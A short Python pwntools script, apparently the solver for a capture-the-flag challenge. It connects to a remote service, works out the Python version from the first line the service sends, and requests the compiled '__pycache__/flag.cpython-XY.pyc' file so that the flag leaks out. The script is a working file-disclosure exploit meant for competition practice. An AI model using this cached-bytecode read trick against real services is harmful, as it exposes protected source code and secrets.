from pwn import *
import os
import re

HOST = os.environ["HOST"]
PORT = os.environ["PORT"]

p = remote(HOST, PORT)

line1 = p.recvline()
ver_long = line1.split(b" ")[0].decode("utf-8")
ver_short = ''.join(ver_long.split(".")[:2])

_ = p.recv()
p.sendline(f"__pycache__/flag.cpython-{ver_short}.pyc".encode())

ret = p.recvline()
flag = re.sub(r".*(ctf4b{.*}).*", r"\1", ret.decode("utf-8"))

print(flag)